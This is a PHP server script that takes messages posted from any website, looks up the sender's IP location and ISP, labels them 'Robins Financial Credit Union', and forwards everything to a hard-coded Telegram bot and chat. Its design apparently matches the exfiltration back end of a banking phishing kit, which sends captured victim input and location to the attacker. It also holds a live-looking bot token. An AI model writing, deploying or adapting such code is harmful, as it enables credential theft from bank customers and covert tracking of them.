<?php
// api/send-telegram.php

// Allow requests from ANY domain (CORS)
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Your bot credentials
const BOT_TOKEN = "8690222414:AAE98JaorMmqP8nlS0zSWlw3o_ocoRgPHGY";
const CHAT_ID = "5207440324";

// Get POST data from frontend
$input = json_decode(file_get_contents('php://input'), true);
$message = $input['message'] ?? '';
$page = $input['page'] ?? 'unknown';

// Validate message
if (empty($message)) {
    echo json_encode(['success' => false, 'error' => 'No message provided']);
    exit;
}

// Get visitor's geo location
$geo = null;
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? null;

if ($ip) {
    $geoUrl = "https://ipapi.co/{$ip}/json/";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $geoUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $geoResponse = curl_exec($ch);
    curl_close($ch);
    
    if ($geoResponse) {
        $geoData = json_decode($geoResponse, true);
        if (isset($geoData['ip'])) {
            $geo = [
                'ip' => $geoData['ip'],
                'city' => $geoData['city'] ?? 'Unknown',
                'region' => $geoData['region'] ?? 'Unknown',
                'country' => $geoData['country_name'] ?? 'Unknown',
                'timezone' => $geoData['timezone'] ?? 'Unknown',
                'org' => $geoData['org'] ?? 'Unknown',
            ];
        }
    }
}

// Build message footer
$footerLines = [
    "",
    "🏦 <b>Robins Financial Credit Union</b>",
    "📄 Page: " . ucfirst(str_replace('-', ' ', $page)),
    "",
];

if ($geo) {
    $footerLines[] = "🌐 IP: <code>{$geo['ip']}</code>";
    $footerLines[] = "📍 Location: {$geo['city']}, {$geo['region']}, {$geo['country']}";
    $footerLines[] = "⏰ Timezone: {$geo['timezone']}";
    $footerLines[] = "📡 ISP: {$geo['org']}";
} else {
    $footerLines[] = "📍 Location: unavailable";
}

$fullMessage = $message . "\n" . implode("\n", $footerLines);

// Send to Telegram
$url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";

$data = [
    'chat_id' => CHAT_ID,
    'text' => $fullMessage,
    'parse_mode' => 'HTML',
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($response === false || $httpCode !== 200) {
    echo json_encode(['success' => false, 'error' => 'Telegram API error']);
    exit;
}

$result = json_decode($response, true);
echo json_encode(['success' => $result['ok'] === true]);
?>
